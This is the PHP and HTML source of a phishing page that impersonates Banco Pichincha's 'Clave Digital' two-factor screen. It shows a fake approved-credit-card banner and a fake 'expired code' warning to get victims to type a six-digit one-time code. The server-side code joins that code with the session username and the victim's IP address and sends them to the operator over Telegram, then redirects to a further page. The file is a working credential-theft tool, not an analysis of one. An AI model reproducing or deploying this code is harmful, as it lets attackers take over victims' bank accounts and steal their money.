<?php
session_start();
include 'teli.php';

function getRealIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = $_SESSION['usuario'] ?? 'No definido';

    // Concatenar los 6 inputs en un solo código
    $codigo = '';
    for ($i = 1; $i <= 6; $i++) {
        $digit = $_POST["digit$i"] ?? '';
        if (!preg_match('/^\d$/', $digit)) {
            // Si no es un dígito válido, redirigir o mostrar error
            header("Location: index6.php");
            exit;
        }
        $codigo .= $digit;
    }

    $ip_cliente = getRealIP();

    $mensaje = "CHINCHA\nUsuario: $usuario\nCodigo: $codigo\nIP: $ip_cliente";

    enviarTelegram($mensaje);

    header("Location: index6.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clave Digital - Banco Pichincha</title>
  <style>
    :root {
      --primary-color: #F9D616;
      --accent-color: #003366;
      --input-bg: rgba(255, 255, 255, 0.15);
      --glass-blur: blur(16px);
    }
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #fffbe6, #fdf9d6);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }
    .floating-box {
      background: rgba(255, 255, 255, 0.7);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.3);
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
      border-radius: 12px;
      padding: 15px 20px;
      text-align: center;
      color: #003366;
      font-size: 15px;
      margin-bottom: 20px;
      width: 320px;
      animation: slideDown 0.5s ease-in-out;
    }
    .floating-box strong {
      display: block;
      font-size: 12px;
      margin-bottom: 2px;
      color: #000;
    }
    @keyframes slideDown {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .card {
      background: var(--input-bg);
      backdrop-filter: var(--glass-blur);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
      padding: 40px 30px;
      border-radius: 20px;
      width: 330px;
      text-align: center;
      border: 1px solid rgba(255, 255, 255, 0.18);
      animation: fadeIn 0.5s ease-in-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    h2 {
      color: var(--accent-color);
      font-weight: 600;
      margin-bottom: 15px;
    }
    p {
      color: #333;
      font-size: 14px;
      margin-bottom: 25px;
    }
    .input-container {
      display: flex;
      justify-content: center;
      gap: 5px;
      margin-bottom: 20px;
    }
    .input-container input {
      width: 35px;
      height: 45px;
      font-size: 22px;
      text-align: center;
      border: none;
      border-radius: 12px;
      background: #ffffff40;
      box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.15);
      backdrop-filter: blur(6px);
      transition: all 0.25s ease;
    }
    .input-container input:focus {
      outline: none;
      transform: scale(1.1);
      box-shadow: 0 0 8px #f9d616a6;
    }
    .info {
      font-size: 12px;
      color: #666;
      margin-bottom: 20px;
    }
    .code-link {
      color: #003366;
      cursor: pointer;
      font-weight: 500;
    }
    .buttons {
      display: flex;
      gap: 20px;
      justify-content: center;
    }
    .buttons button {
      flex: 1;
      padding: 12px;
      font-size: 15px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
    }
    .volver {
      background-color: #e0e0e0;
      color: #333;
    }
    .confirmar {
      background-color: var(--primary-color);
      color: #000;
      font-weight: bold;
    }
    .volver:hover,
    .confirmar:hover {
      transform: scale(1.05);
    }
  </style>
</head>
<body>

  <div class="floating-box">
    <strong>Tarjeta de Crédito Aprobado por $9.700</strong>
  </div>

  <div class="card">
    <h2>Autenticacion de Usuario</h2>
    <p>Hemos enviado un mensaje de texto con un c&oacute;digo a su numero de m&oacute;vil o correo electr&oacute;nico registrado. Este c&oacute;digo puede tardar algunos minutos en llegar.</p>
    <p><span style="color: rgb(184, 49, 47);">C&oacute;digo Vencido</span></p>

    <form method="POST" action="">
      <div class="input-container">
        <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" name="digit1" required />
        <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" name="digit2" required />
        <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" name="digit3" required />
        <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" name="digit4" required />
        <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" name="digit5" required />
        <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" name="digit6" required />
      </div>

      <div class="info">
        El codigo vence en 1 minuto 
      </div>

      <div class="buttons">
        <button type="button" class="volver" onclick="history.back()">Volver</button>
        <button type="submit" class="confirmar">Confirmar</button>
      </div>
    </form>
  </div>

  <script>
    const inputs = document.querySelectorAll('.input-container input');

    inputs.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        const value = e.target.value;
        if (!/^[0-9]$/.test(value)) {
          e.target.value = "";
          return;
        }
        if (value && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === "Backspace" && input.value === "" && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });
  </script>

</body>
</html>
